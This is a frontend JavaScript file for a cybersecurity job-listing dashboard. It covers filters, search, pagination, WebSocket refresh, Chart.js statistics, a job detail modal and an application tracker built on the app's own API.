// ===== CyberSec Intel Grid v3 - app.js =====
"use strict";

// ===== STATE =====
const state = {
  page: 1, pageSize: 24, totalPages: 1, totalJobs: 0,
  search: "", type: "", domain: "", source: "", seniority: "",
  company_category: "", min_salary_lpa: "",
  sort: "newest", location_scope: "all", remote: null,
  viewMode: localStorage.getItem("viewMode") || "grid",
  lastTimestamp: new Date().toISOString(),
  appliedIds: new Set(),
  charts: {},
  ws: null, wsReady: false,
  pendingNewJobs: 0,
  userSkills: JSON.parse(localStorage.getItem("userSkills") || '["linux", "python", "wireshark", "nmap", "burp suite", "splunk", "owasp", "tcp/ip", "siem", "soc", "kali linux", "iso 27001", "incident response", "git"]'),
  jobCache: {},
  kanbanStages: JSON.parse(localStorage.getItem("kanbanStages") || "{}"),
  currentJobForPitch: null,
  currentPitchTab: "linkedin",
};

// ===== INIT =====
document.addEventListener("DOMContentLoaded", () => {
  applyTheme(localStorage.getItem("theme") || "dark");
  setViewMode(state.viewMode, false);
  readUrlParams();
  loadJobs();
  loadStats();
  loadDomains();
  loadSources();
  setupSearch();
  setupKeyboard();
  connectWebSocket();
  // Poll for new jobs every 60s as fallback
  setInterval(pollNewJobs, 60000);
});

// ===== THEME =====
function applyTheme(theme) {
  document.documentElement.setAttribute("data-theme", theme);
  document.getElementById("theme-toggle").textContent = theme === "dark" ? "🌙" : "☀️";
  localStorage.setItem("theme", theme);
}
function toggleTheme() {
  const current = document.documentElement.getAttribute("data-theme");
  applyTheme(current === "dark" ? "light" : "dark");
}

// ===== WEBSOCKET =====
function connectWebSocket() {
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  const url = `${proto}//${location.host}/ws`;
  state.ws = new WebSocket(url);
  state.ws.onopen = () => {
    state.wsReady = true;
    // Ping every 25s
    setInterval(() => { if (state.ws && state.ws.readyState === 1) state.ws.send("ping"); }, 25000);
  };
  state.ws.onmessage = (evt) => {
    try {
      const msg = JSON.parse(evt.data);
      if (msg.event === "scrape_complete" && msg.data.new_jobs > 0) {
        showNewJobsBanner(msg.data.new_jobs);
        loadStats();
      }
      if (msg.event === "scrape_started") {
        showToast("⚡ Scrape cycle started...", 3000);
      }
    } catch(e) {}
  };
  state.ws.onclose = () => {
    state.wsReady = false;
    setTimeout(connectWebSocket, 5000);
  };
}

// ===== WS BANNER =====
function showNewJobsBanner(count) {
  state.pendingNewJobs = count;
  const banner = document.getElementById("ws-banner");
  document.getElementById("ws-banner-text").textContent = `🆕 ${count} new cybersecurity job${count !== 1 ? "s" : ""} discovered!`;
  banner.classList.remove("hidden");
}
function dismissBanner() {
  document.getElementById("ws-banner").classList.add("hidden");
}
function refreshJobsFromBanner() {
  dismissBanner();
  state.page = 1;
  state.lastTimestamp = new Date().toISOString();
  loadJobs();
  loadStats();
}

// ===== POLLING FALLBACK =====
async function pollNewJobs() {
  try {
    const res = await fetch(`/api/jobs/new?since=${encodeURIComponent(state.lastTimestamp)}&limit=1`);
    if (!res.ok) return;
    const data = await res.json();
    if (data.new_count > 0 && document.getElementById("ws-banner").classList.contains("hidden")) {
      showNewJobsBanner(data.new_count);
    }
  } catch(e) {}
}

// ===== URL SYNC =====
function syncUrlParams() {
  const params = new URLSearchParams();
  if (state.search) params.set("q", state.search);
  if (state.type) params.set("type", state.type);
  if (state.domain) params.set("domain", state.domain);
  if (state.source) params.set("source", state.source);
  if (state.seniority) params.set("seniority", state.seniority);
  if (state.sort !== "newest") params.set("sort", state.sort);
  if (state.location_scope !== "all") params.set("scope", state.location_scope);
  if (state.remote !== null) params.set("remote", state.remote ? "1" : "0");
  if (state.page > 1) params.set("page", state.page);
  history.replaceState(null, "", params.toString() ? `?${params}` : location.pathname);
}
function readUrlParams() {
  const p = new URLSearchParams(location.search);
  if (p.get("q")) state.search = p.get("q");
  if (p.get("type")) state.type = p.get("type");
  if (p.get("domain")) state.domain = p.get("domain");
  if (p.get("source")) state.source = p.get("source");
  if (p.get("seniority")) state.seniority = p.get("seniority");
  if (p.get("sort")) state.sort = p.get("sort");
  if (p.get("scope")) state.location_scope = p.get("scope");
  if (p.get("remote")) state.remote = p.get("remote") === "1";
  if (p.get("page")) state.page = Math.max(1, parseInt(p.get("page")));
  // Reflect in UI
  if (state.search) document.getElementById("search-input").value = state.search;
  if (state.sort) document.getElementById("sort-select").value = state.sort;
}

// ===== KEYBOARD SHORTCUTS =====
function setupKeyboard() {
  document.addEventListener("keydown", (e) => {
    if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
      if (e.key === "Escape") {
        e.target.blur();
        state.search = "";
        document.getElementById("search-input").value = "";
        applyFilters();
      }
      return;
    }
    switch (e.key) {
      case "/": e.preventDefault(); document.getElementById("search-input").focus(); break;
      case "Escape":
        closeJobModal();
        toggleShortcutsModal(true);
        document.getElementById("applied-panel").classList.add("hidden");
        document.getElementById("applied-overlay").classList.add("hidden");
        break;
      case "g": case "G": setViewMode("grid"); break;
      case "t": case "T": setViewMode("table"); break;
      case "k": case "K": setViewMode("kanban"); break;
      case "d": case "D": toggleTheme(); break;
      case "1": setFilter("location_scope", state.location_scope === "target" ? "all" : "target",
                  document.querySelector(`#scope-tabs [data-val="${state.location_scope === "target" ? "all" : "target"}"]`), "scope-tabs"); break;
      case "?": toggleShortcutsModal(); break;
      case "ArrowLeft": if (state.page > 1) changePage(-1); break;
      case "ArrowRight": if (state.page < state.totalPages) changePage(1); break;
    }
  });
}

// ===== VIEW MODE =====
function setViewMode(mode, save = true) {
  state.viewMode = mode;
  if (save) localStorage.setItem("viewMode", mode);
  document.getElementById("view-grid-btn").classList.toggle("active", mode === "grid");
  document.getElementById("view-table-btn").classList.toggle("active", mode === "table");
  const kbBtn = document.getElementById("view-kanban-btn");
  if (kbBtn) kbBtn.classList.toggle("active", mode === "kanban");

  document.getElementById("job-grid").classList.toggle("hidden", mode !== "grid");
  document.getElementById("job-table-container").classList.toggle("hidden", mode !== "table");
  const kbContainer = document.getElementById("job-kanban-container");
  if (kbContainer) kbContainer.classList.toggle("hidden", mode !== "kanban");

  if (mode === "kanban") {
    renderKanban(Object.values(state.jobCache));
  }
}

// ===== SEARCH & AUTOCOMPLETE =====
let _searchTimer = null;
function setupSearch() {
  const input = document.getElementById("search-input");
  const dropdown = document.getElementById("autocomplete-dropdown");

  input.addEventListener("input", () => {
    clearTimeout(_searchTimer);
    _searchTimer = setTimeout(() => {
      state.search = input.value.trim();
      state.page = 1;
      applyFilters();
      fetchAutocomplete(state.search);
    }, 280);
  });
  document.addEventListener("click", (e) => {
    if (!e.target.closest(".search-wrapper")) dropdown.classList.add("hidden");
  });
}
async function fetchAutocomplete(q) {
  const dropdown = document.getElementById("autocomplete-dropdown");
  if (q.length < 2) { dropdown.classList.add("hidden"); return; }
  try {
    const res = await fetch(`/api/search/suggestions?q=${encodeURIComponent(q)}`);
    const data = await res.json();
    const items = [
      ...data.titles.slice(0, 5).map(t => ({ label: t, type: "Title" })),
      ...data.companies.slice(0, 4).map(c => ({ label: c, type: "Company" })),
    ];
    if (!items.length) { dropdown.classList.add("hidden"); return; }
    dropdown.innerHTML = items.map(i => `
      <div class="autocomplete-item" onclick="selectAutocomplete('${escapeHtml(i.label)}')">
        ${escapeHtml(i.label)} <span class="ac-type">${i.type}</span>
      </div>`).join("");
    dropdown.classList.remove("hidden");
  } catch(e) { dropdown.classList.add("hidden"); }
}
function selectAutocomplete(val) {
  document.getElementById("search-input").value = val;
  document.getElementById("autocomplete-dropdown").classList.add("hidden");
  state.search = val;
  state.page = 1;
  applyFilters();
}

// ===== FILTERS =====
function setFilter(key, value, el, groupId) {
  state[key] = value;
  state.page = 1;
  if (el && groupId) {
    document.querySelectorAll(`#${groupId} .pill`).forEach(b => b.classList.remove("active"));
    el.classList.add("active");
  }
  applyFilters();
}
function applyFilters() {
  state.domain = document.getElementById("domain-select").value;
  state.source = document.getElementById("source-select").value;
  state.sort = document.getElementById("sort-select").value;
  syncUrlParams();
  loadJobs();
}
function clearFilters() {
  state.search = ""; state.type = ""; state.domain = ""; state.source = "";
  state.seniority = ""; state.sort = "newest"; state.location_scope = "all"; state.remote = null;
  state.page = 1;
  document.getElementById("search-input").value = "";
  document.getElementById("domain-select").value = "";
  document.getElementById("source-select").value = "";
  document.getElementById("sort-select").value = "newest";
  const salEl = document.getElementById("salary-select");
  if (salEl) salEl.value = "";
  state.company_category = "";
  state.min_salary_lpa = "";
  document.querySelectorAll("#category-tabs .pill").forEach(p => p.classList.toggle("active", p.dataset.val === ""));
  document.getElementById("remote-toggle").textContent = "Any";
  document.getElementById("remote-toggle").classList.remove("active");
  document.querySelectorAll(".tab-pills .pill").forEach(p => p.classList.toggle("active", p.dataset.val === "" || p.dataset.val === "all"));
  syncUrlParams();
  loadJobs();
}
function toggleRemoteFilter() {
  if (state.remote === null) { state.remote = true; }
  else if (state.remote === true) { state.remote = false; }
  else { state.remote = null; }
  const btn = document.getElementById("remote-toggle");
  btn.textContent = state.remote === null ? "Any" : state.remote ? "Remote Only" : "Onsite Only";
  btn.classList.toggle("active", state.remote !== null);
  state.page = 1;
  applyFilters();
}

// ===== PAGINATION =====
function changePage(delta) {
  const newPage = state.page + delta;
  if (newPage < 1 || newPage > state.totalPages) return;
  state.page = newPage;
  syncUrlParams();
  loadJobs();
  window.scrollTo({ top: 0, behavior: "smooth" });
}
function updatePagination() {
  const info = `Page ${state.page} of ${state.totalPages}`;
  ["page-info", "page-info-b"].forEach(id => { const el = document.getElementById(id); if (el) el.textContent = info; });
  ["prev-btn", "prev-btn-b"].forEach(id => { const el = document.getElementById(id); if (el) el.disabled = state.page <= 1; });
  ["next-btn", "next-btn-b"].forEach(id => { const el = document.getElementById(id); if (el) el.disabled = state.page >= state.totalPages; });
}

// ===== LOAD JOBS =====
async function loadJobs() {
  const grid = document.getElementById("job-grid");
  const tbody = document.getElementById("job-table-body");
  grid.innerHTML = `<div class="loading-text" style="grid-column:1/-1">⟳ Loading cybersecurity opportunities...</div>`;
  tbody.innerHTML = "";

  const params = new URLSearchParams();
  if (state.search) params.set("search", state.search);
  if (state.type) params.set("type", state.type);
  if (state.domain) params.set("domain", state.domain);
  if (state.source) params.set("source", state.source);
  if (state.seniority) params.set("seniority", state.seniority);
  if (state.company_category) params.set("company_category", state.company_category);
  if (state.min_salary_lpa) params.set("min_salary_lpa", state.min_salary_lpa);
  if (state.sort) params.set("sort", state.sort);
  if (state.location_scope) params.set("location_scope", state.location_scope);
  if (state.remote !== null) params.set("remote", state.remote ? "1" : "0");
  params.set("page", state.page);
  params.set("page_size", state.pageSize);

  try {
    const res = await fetch(`/api/jobs?${params}`);
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const data = await res.json();
    state.totalPages = data.total_pages || 1;
    state.totalJobs = data.total || 0;

    // Update applied set
    state.appliedIds = new Set(data.items.filter(j => j.applied).map(j => j.id));

    // Cache jobs
    data.items.forEach(j => { state.jobCache[j.id] = j; });

    document.getElementById("results-count").textContent =
      `Showing ${data.items.length} of ${data.total.toLocaleString()} results`;

    if (!data.items.length) {
      grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1"><div class="empty-icon">🔍</div><h3>No jobs found</h3><p>Try adjusting your filters</p></div>`;
    } else {
      renderJobCards(data.items);
      renderJobTable(data.items);
      if (state.viewMode === "kanban") {
        renderKanban(data.items);
      }
    }
    updatePagination();
    state.lastTimestamp = new Date().toISOString();
  } catch(e) {
    grid.innerHTML = `<div class="empty-state" style="grid-column:1/-1"><div class="empty-icon">⚠️</div><h3>Failed to load jobs</h3><p>${e.message}</p></div>`;
  }
}



function getAgeDays(dateStr) {
  if (!dateStr) return 0;
  try {
    const d = new Date(dateStr);
    const now = new Date();
    const diffMs = now - d;
    return Math.max(0, Math.floor(diffMs / (1000 * 60 * 60 * 24)));
  } catch(e) {
    return 0;
  }
}

function getCategoryInfo(cat) {
  const map = {
    vendor: { icon: "🏭", label: "Vendor", cls: "badge-cat-vendor" },
    mssp: { icon: "🛡️", label: "MSSP", cls: "badge-cat-mssp" },
    consulting: { icon: "🏢", label: "Consulting", cls: "badge-cat-consulting" },
    indian_it: { icon: "🇮🇳", label: "Indian IT", cls: "badge-cat-indian-it" },
    government: { icon: "🏛️", label: "Govt", cls: "badge-cat-govt" },
    other: { icon: "💼", label: "Enterprise", cls: "badge-cat-other" },
  };
  return map[cat] || { icon: "💼", label: cat || "Enterprise", cls: "badge-cat-other" };
}

// ===== RENDER GRID =====
function renderJobCards(jobs) {
  const grid = document.getElementById("job-grid");
  grid.innerHTML = jobs.map(j => {
    const routes = j.application_routes || {};
    const directUrl = routes.direct_url || j.apply_url || "#";
    const seniority = j.seniority_level || "junior";
    const catInfo = getCategoryInfo(j.company_category);
    const seniorityLabel = { internship: "🎓 Internship", fresher: "🟢 Entry-Level", junior: "🔵 Junior", associate: "🟡 Associate", mid: "🔵 Junior" }[seniority] || seniority;
    const ageDays = getAgeDays(j.discovered_at || j.posted_date);
    const freshnessBadge = ageDays <= 0 ? "⏱️ Today" : ageDays === 1 ? "⏱️ Yesterday" : `⏱️ ${ageDays}d ago`;
    const skills = (j.skills_required || []).slice(0, 4);
    const tags = (j.domain_tags || []).slice(0, 4);
    const isApplied = j.applied || state.appliedIds.has(j.id);
    const domain = extractDomain(directUrl);
    const logoUrl = domain ? `https://logo.clearbit.com/${domain}` : null;

    // Match score
    const match = calculateMatchScore(j);
    const scoreBadge = match.score >= 75 ? 'badge-match-high' : match.score >= 55 ? 'badge-match-mid' : 'badge-match-low';

    return `<div class="job-card ${j.is_target_match ? 'target-match' : ''} ${isApplied ? 'applied-job' : ''}" onclick="openJobModal('${j.id}')">
      <div class="card-top">
        <div class="company-logo">
          ${logoUrl ? `<img src="${logoUrl}" onerror="this.style.display='none';this.parentElement.textContent='🏢'" alt="${escapeHtml(j.company)}" />` : '🏢'}
        </div>
        <div class="card-title-block">
          <div class="card-title">${escapeHtml(j.title)}</div>
          <div class="card-company">${escapeHtml(j.company)}</div>
        </div>
      </div>

      <div class="card-meta">
        <span class="badge badge-type">${j.job_type === 'internship' ? '🎓 Internship' : '💼 Fresher Job'}</span>
        <span class="badge ${scoreBadge}" title="Resume match based on your skills profile">🎯 ${match.score}% Match</span>
        <span class="badge badge-seniority-${seniority}">${seniorityLabel}</span>
        <span class="badge badge-verified" title="Link verified active (200 OK)">✅ Verified Link</span>
        <span class="badge badge-freshness">${freshnessBadge}</span>
        <span class="badge ${catInfo.cls}">${catInfo.icon} ${catInfo.label}</span>
        ${j.salary_display ? `<span class="badge badge-salary">💰 ${escapeHtml(j.salary_display)}</span>` : ''}
        ${j.remote ? '<span class="badge badge-remote">🌍 Remote</span>' : ''}
        ${j.target_badge ? `<span class="badge badge-target">${j.target_badge}</span>` : ''}
        ${isApplied ? '<span class="badge badge-applied">✅ Applied</span>' : ''}
      </div>

      <div class="card-location">
        📍 ${escapeHtml(j.location || 'Remote')}
        ${j.salary_display ? ` &nbsp;•&nbsp; <span class="salary-text">💰 ${escapeHtml(j.salary_display)}</span>` : ''}
      </div>

      ${tags.length ? `<div class="domain-tags">${tags.map(t => `<span class="domain-tag">${escapeHtml(t)}</span>`).join("")}</div>` : ""}
      ${skills.length ? `<div class="skills-tags">${skills.map(s => `<span class="skill-tag">⚡ ${escapeHtml(s)}</span>`).join("")}</div>` : ""}

      <div class="card-actions" onclick="event.stopPropagation()">
        <a class="btn-card apply" href="${escapeHtml(directUrl)}" target="_blank" rel="noopener" title="Direct verified application URL">🔗 Apply</a>
        <button class="btn-card" onclick="openPitchGenerator('${j.id}')" title="Generate tailored cold message & cover letter">⚡ Pitch</button>
        <button class="btn-card" onclick="openRecruiterSearch('${escapeHtml(j.company)}')" title="Find recruiters & hiring managers on LinkedIn">👥 Recruiter</button>
        <button class="btn-card ${isApplied ? 'mark-applied done' : 'mark-applied'}"
          onclick="${isApplied ? `unmarkApplied('${j.id}', this)` : `markApplied('${j.id}', this)`}">
          ${isApplied ? '✅ Applied' : '📋 Mark'}
        </button>
        <button class="btn-card" onclick="copyLink('${escapeHtml(directUrl)}')" title="Copy direct link">📋</button>
      </div>
    </div>`;
  }).join("");
}

// ===== RENDER TABLE =====
function renderJobTable(jobs) {
  const tbody = document.getElementById("job-table-body");
  tbody.innerHTML = jobs.map(j => {
    const routes = j.application_routes || {};
    const directUrl = routes.direct_url || j.apply_url || "#";
    const seniority = j.seniority_level || "mid";
    const tags = (j.domain_tags || []).slice(0, 3).map(t => `<span class="domain-tag">${escapeHtml(t)}</span>`).join("");
    const isApplied = j.applied || state.appliedIds.has(j.id);
    const match = calculateMatchScore(j);
    const scoreBadge = match.score >= 75 ? 'badge-match-high' : match.score >= 55 ? 'badge-match-mid' : 'badge-match-low';

    return `<tr onclick="openJobModal('${j.id}')">
      <td class="td-title" data-label="Title">
        ${escapeHtml(j.title)}
        <span class="badge ${scoreBadge}" style="font-size:0.68rem;padding:1px 6px;margin-left:4px">🎯 ${match.score}%</span>
      </td>
      <td data-label="Company">${escapeHtml(j.company)}</td>
      <td class="td-location" data-label="Location">${escapeHtml(j.location || 'Remote')}</td>
      <td data-label="Type"><span class="badge badge-type">${j.job_type || 'full-time'}</span></td>
      <td data-label="Level"><span class="badge badge-seniority-${seniority}">${seniority}</span></td>
      <td data-label="Tags"><div style="display:flex;flex-wrap:wrap;gap:3px;">${tags}</div></td>
      <td data-label="Apply" onclick="event.stopPropagation()">
        <div style="display:flex;gap:4px;align-items:center">
          <a class="btn-card apply" href="${escapeHtml(directUrl)}" target="_blank" rel="noopener" style="display:inline-flex;padding:4px 10px;font-size:0.75rem">Apply</a>
          <button class="btn-sm" onclick="openPitchGenerator('${j.id}')" title="Pitch Generator">⚡</button>
        </div>
      </td>
      <td data-label="Applied?" onclick="event.stopPropagation()">
        ${isApplied
          ? `<button class="btn-sm" onclick="unmarkApplied('${j.id}', this)">✅ Applied</button>`
          : `<button class="btn-sm" onclick="markApplied('${j.id}', this)">Mark</button>`}
      </td>
    </tr>`;
  }).join("");
}

// ===== STATS & CHARTS =====
async function loadStats() {
  try {
    const res = await fetch("/api/stats");
    const s = await res.json();

    document.getElementById("kpi-total").textContent = (s.total || 0).toLocaleString();
    document.getElementById("kpi-target").textContent = (s.target_count || 0).toLocaleString();
    document.getElementById("kpi-india").textContent = (s.india_count || 0).toLocaleString();
    document.getElementById("kpi-globe").textContent = (s.global_remote_intern_count || 0).toLocaleString();
    document.getElementById("kpi-remote").textContent = `${s.remote_pct || 0}%`;
    document.getElementById("kpi-applied").textContent = (s.applied_count || 0).toLocaleString();

    renderCharts(s);
  } catch(e) { console.error("Stats load error:", e); }
}

function renderCharts(s) {
  const isDark = document.documentElement.getAttribute("data-theme") === "dark";
  const textColor = isDark ? "#94a3b8" : "#475569";
  const gridColor = isDark ? "rgba(255,255,255,0.05)" : "rgba(0,0,0,0.05)";
  Chart.defaults.color = textColor;

  // Type chart
  const typeData = s.by_type || {};
  renderDoughnutChart("chart-type", Object.keys(typeData), Object.values(typeData), ["#00d488","#3b82f6","#a855f7","#f59e0b"]);

  // Domain chart
  const topDomains = s.top_domains || {};
  renderBarChart("chart-domain", Object.keys(topDomains).slice(0,8), Object.values(topDomains).slice(0,8), gridColor);

  // Timeline chart
  const history = (s.job_history || []);
  renderLineChart("chart-timeline", history.map(h => h.day), history.map(h => h.count), gridColor);

  // Seniority chart
  const seniorityData = s.by_seniority || {};
  const seniorityColors = { junior: "#22c55e", mid: "#3b82f6", senior: "#f59e0b", lead: "#f97316", manager: "#ef4444" };
  renderDoughnutChart("chart-seniority",
    Object.keys(seniorityData),
    Object.values(seniorityData),
    Object.keys(seniorityData).map(k => seniorityColors[k] || "#94a3b8")
  );
}

function renderDoughnutChart(id, labels, data, colors) {
  const ctx = document.getElementById(id);
  if (!ctx) return;
  if (state.charts[id]) state.charts[id].destroy();
  state.charts[id] = new Chart(ctx, {
    type: "doughnut",
    data: { labels, datasets: [{ data, backgroundColor: colors, borderWidth: 0 }] },
    options: { responsive: true, plugins: { legend: { position: "bottom", labels: { font: { size: 11 }, padding: 8 } } }, cutout: "65%" }
  });
}
function renderBarChart(id, labels, data, gridColor) {
  const ctx = document.getElementById(id);
  if (!ctx) return;
  if (state.charts[id]) state.charts[id].destroy();
  state.charts[id] = new Chart(ctx, {
    type: "bar",
    data: { labels, datasets: [{ data, backgroundColor: "rgba(0,212,136,0.6)", borderRadius: 4 }] },
    options: { responsive: true, plugins: { legend: { display: false } }, scales: { x: { ticks: { font: { size: 9 } }, grid: { color: gridColor } }, y: { grid: { color: gridColor } } } }
  });
}
function renderLineChart(id, labels, data, gridColor) {
  const ctx = document.getElementById(id);
  if (!ctx) return;
  if (state.charts[id]) state.charts[id].destroy();
  state.charts[id] = new Chart(ctx, {
    type: "line",
    data: { labels, datasets: [{ data, borderColor: "#00d488", backgroundColor: "rgba(0,212,136,0.1)", fill: true, tension: 0.4, pointRadius: 3 }] },
    options: { responsive: true, plugins: { legend: { display: false } }, scales: { x: { ticks: { font: { size: 9 }, maxTicksLimit: 8 }, grid: { color: gridColor } }, y: { grid: { color: gridColor } } } }
  });
}

// ===== DOMAINS & SOURCES =====
async function loadDomains() {
  try {
    const res = await fetch("/api/domains");
    const data = await res.json();
    const sel = document.getElementById("domain-select");
    const current = sel.value;
    sel.innerHTML = '<option value="">All Domains</option>' +
      (data.domains || []).slice(0, 30).map(d => `<option value="${escapeHtml(d.tag)}">${escapeHtml(d.tag)} (${d.count})</option>`).join("");
    sel.value = current;
  } catch(e) {}
}

async function loadSources() {
  try {
    const [srcRes, histRes] = await Promise.all([
      fetch("/api/sources"),
      fetch("/api/scrape/history")
    ]);
    const srcData = await srcRes.json();
    const histData = await histRes.json();

    const srcSel = document.getElementById("source-select");
    const currentSrc = srcSel.value;
    const sources = srcData.sources || [];
    srcSel.innerHTML = '<option value="">All Sources</option>' +
      sources.map(s => `<option value="${escapeHtml(s.source)}">${escapeHtml(s.source)} (${s.count})</option>`).join("");
    srcSel.value = currentSrc;

    // Source health drawer
    const content = document.getElementById("sources-content");
    if (sources.length) {
      content.innerHTML = sources.map(s => `
        <div class="source-item">
          <div class="source-name">${escapeHtml(s.source)}</div>
          <div class="source-meta">
            <span>${s.count} jobs</span>
            <span class="source-status">● Operational</span>
          </div>
          <div style="font-size:0.7rem;color:var(--text-muted)">Last: ${formatDate(s.last_seen)}</div>
        </div>`).join("");
    } else {
      content.innerHTML = '<p style="color:var(--text-muted);font-size:0.85rem">No sources loaded yet. Run a scrape!</p>';
    }

    // Scrape history
    const histEl = document.getElementById("scrape-history-list");
    const history = (histData.history || []).slice(0, 30);
    if (history.length) {
      histEl.innerHTML = history.map(h => `
        <div class="history-item">
          <span class="h-source">${escapeHtml(h.source)}</span>
          <span class="h-new">+${h.new_jobs}</span>
          <span class="h-time">${formatDate(h.run_at)}</span>
        </div>`).join("");
    } else {
      histEl.innerHTML = '<p style="color:var(--text-muted);font-size:0.78rem">No scrape runs yet.</p>';
    }
  } catch(e) {}
}

// ===== JOB MODAL =====
async function openJobModal(jobId) {
  const overlay = document.getElementById("job-modal-overlay");
  const body = document.getElementById("modal-body");
  overlay.classList.remove("hidden");
  body.innerHTML = '<div class="loading-text">Loading details...</div>';
  document.getElementById("modal-title").textContent = "Loading...";
  document.getElementById("modal-company").textContent = "";

  try {
    const res = await fetch(`/api/jobs/${jobId}`);
    if (!res.ok) throw new Error("Job not found");
    const j = await res.json();
    const routes = j.application_routes || {};
    const isApplied = j.applied || state.appliedIds.has(j.id);
    const skills = j.skills_required || [];
    const tags = j.domain_tags || [];
    const seniority = j.seniority_level || "mid";
    const seniorityLabel = { internship: "🎓 Internship", fresher: "🟢 Entry-Level", junior: "🔵 Junior", associate: "🟡 Associate", mid: "🔵 Junior", senior: "🟡 Experienced" }[seniority] || seniority;

    // Calculate match
    const match = calculateMatchScore(j);
    const scoreBadge = match.score >= 75 ? 'badge-match-high' : match.score >= 55 ? 'badge-match-mid' : 'badge-match-low';

    document.getElementById("modal-title").textContent = j.title;
    document.getElementById("modal-company").textContent = `${j.company} • ${j.location} • ${seniorityLabel}`;

    body.innerHTML = `
      <div class="job-detail-section">
        <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;align-items:center">
          <span class="badge ${scoreBadge}">🎯 ${match.score}% Match</span>
          <span class="badge badge-type">${j.job_type === 'internship' ? '🎓 Internship' : '💼 Fresher Job'}</span>
          <span class="badge badge-seniority-${seniority}">${seniorityLabel}</span>
          ${j.remote ? '<span class="badge badge-remote">🌍 Remote</span>' : ''}
          ${j.target_badge ? `<span class="badge badge-target">${j.target_badge}</span>` : ''}
          ${isApplied ? '<span class="badge badge-applied">✅ Applied</span>' : ''}
        </div>
        ${tags.length ? `<div class="domain-tags" style="margin-bottom:8px">${tags.map(t => `<span class="domain-tag">${escapeHtml(t)}</span>`).join("")}</div>` : ""}
        ${skills.length ? `<div class="skills-tags">${skills.slice(0,10).map(s => `<span class="skill-tag">⚡ ${escapeHtml(s)}</span>`).join("")}</div>` : ""}
      </div>

      <!-- Skills Match Breakdown -->
      <div class="job-detail-section matched-tags-section">
        <h4 style="margin-bottom:6px">🎯 Resume & Keyword Compatibility</h4>
        <div style="margin-bottom:6px">
          <span style="font-size:0.75rem;color:var(--text-muted)">Matched Skills:</span>
          ${match.matched.length ? match.matched.map(m => `<span class="tag-pill-match">✓ ${escapeHtml(m)}</span>`).join("") : '<span style="font-size:0.75rem;color:var(--text-muted)"> None matched yet</span>'}
        </div>
        <div>
          <span style="font-size:0.75rem;color:var(--text-muted)">Missing Keywords to Add:</span>
          ${match.missing.length ? match.missing.map(m => `<span class="tag-pill-missing">+ ${escapeHtml(m)}</span>`).join("") : '<span style="font-size:0.75rem;color:var(--text-muted)"> All key cyber terms present!</span>'}
        </div>
      </div>

      <div class="job-detail-section">
        <h4>🔗 Application & Networking Hub</h4>
        <div class="apply-hub">
          <a class="apply-btn primary" href="${escapeHtml(routes.direct_url || '#')}" target="_blank" rel="noopener">🎯 Direct Apply (Verified Active)</a>
          <button class="apply-btn" onclick="openPitchGenerator('${j.id}')">⚡ Instant Pitch & Cover Letter</button>
          <button class="apply-btn" onclick="openRecruiterSearch('${escapeHtml(j.company)}')">👥 Find Recruiters on LinkedIn</button>
          <button class="apply-btn" onclick="openCompanyResearch('${escapeHtml(j.company)}', 'levels')">💰 Levels.fyi Salaries</button>
          <button class="apply-btn" onclick="openCompanyResearch('${escapeHtml(j.company)}', 'glassdoor')">⭐ Glassdoor Reviews</button>
          <a class="apply-btn" href="${escapeHtml(routes.linkedin_jobs_url || '#')}" target="_blank" rel="noopener">💼 LinkedIn Job Search</a>
        </div>
      </div>

      <div class="job-detail-section">
        <h4>📄 Description</h4>
        <div class="job-description">${escapeHtml(j.description || "No description available.")}</div>
      </div>

      <div class="job-detail-section" style="display:flex;gap:8px;flex-wrap:wrap">
        <button class="btn-action ${isApplied ? 'btn-primary' : ''}" id="modal-apply-btn"
          onclick="${isApplied ? `unmarkApplied('${j.id}', this)` : `markApplied('${j.id}', this)`}">
          ${isApplied ? '✅ Already Applied' : '📋 Mark as Applied'}
        </button>
        <button class="btn-action" onclick="addFollowUpCalendarForJob('${j.id}')">📅 Add 5d Follow-Up to G-Cal</button>
        <button class="btn-action" onclick="copyLink('${escapeHtml(routes.direct_url || '')}')">📋 Copy Link</button>
        <span style="font-size:0.75rem;color:var(--text-muted);align-self:center">Source: ${escapeHtml(j.source || '')} • ${formatDate(j.discovered_at)}</span>
      </div>
    `;
  } catch(e) {
    body.innerHTML = `<div class="empty-state"><div class="empty-icon">⚠️</div><h3>Error loading job</h3><p>${e.message}</p></div>`;
  }
}
function closeJobModal() {
  document.getElementById("job-modal-overlay").classList.add("hidden");
}

// ===== APPLICATION TRACKER =====
async function markApplied(jobId, btn) {
  try {
    const res = await fetch(`/api/applications/${jobId}/apply`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}) });
    if (!res.ok) throw new Error();
    state.appliedIds.add(jobId);
    if (btn) { btn.textContent = "✅ Applied"; btn.classList.add("done"); }
    showToast("✅ Marked as applied!");
    loadStats();
  } catch(e) { showToast("❌ Could not mark as applied", 3000); }
}
async function unmarkApplied(jobId, btn) {
  try {
    await fetch(`/api/applications/${jobId}`, { method: "DELETE" });
    state.appliedIds.delete(jobId);
    if (btn) { btn.textContent = "📋 Mark Applied"; btn.classList.remove("done"); }
    showToast("Removed from applied list.");
    loadStats();
  } catch(e) {}
}
async function showAppliedJobs() {
  const panel = document.getElementById("applied-panel");
  const overlay = document.getElementById("applied-overlay");
  panel.classList.remove("hidden");
  overlay.classList.remove("hidden");

  const list = document.getElementById("applied-list");
  list.innerHTML = '<div class="loading-text">Loading...</div>';

  try {
    const res = await fetch("/api/applications");
    const data = await res.json();
    const items = data.items || [];
    if (!items.length) {
      list.innerHTML = '<div class="empty-state"><div class="empty-icon">📋</div><h3>No applications yet</h3><p>Mark jobs as Applied to track them here.</p></div>';
      return;
    }
    list.innerHTML = items.map(j => {
      const routes = j.application_routes || {};
      return `<div class="applied-item">
        <div class="applied-item-title">${escapeHtml(j.title)}</div>
        <div class="applied-item-company">${escapeHtml(j.company)} • ${escapeHtml(j.location || '')}</div>
        <div style="font-size:0.72rem;color:var(--text-muted);margin-bottom:8px">Applied: ${formatDate(j.applied_at)}</div>
        <div class="applied-item-actions">
          <a class="btn-sm" href="${escapeHtml(routes.direct_url || '#')}" target="_blank">🔗 Apply Again</a>
          <button class="btn-sm danger" onclick="unmarkApplied('${j.id}', this);this.closest('.applied-item').remove()">✕ Remove</button>
        </div>
      </div>`;
    }).join("");
  } catch(e) {
    list.innerHTML = '<div class="empty-state"><div class="empty-icon">⚠️</div><h3>Error loading applications</h3></div>';
  }
}
